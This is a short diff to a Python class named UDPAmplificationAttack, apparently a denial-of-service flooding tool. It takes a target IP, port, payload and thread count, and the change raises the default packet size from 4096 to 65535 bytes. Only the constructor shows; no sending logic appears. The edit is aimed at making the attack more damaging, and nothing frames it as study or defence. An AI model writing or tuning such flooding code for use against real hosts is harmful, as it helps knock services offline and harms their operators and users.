@@ -4,7 +4,7 @@ import threading
 import time
 
 class UDPAmplificationAttack:
-    def __init__(self, target_ip, target_port, payload, packet_size=4096, num_threads=10):
+    def __init__(self, target_ip, target_port, payload, packet_size=65535, num_threads=10):
         self.target_ip = target_ip
         self.target_port = target_port
         self.payload = payload
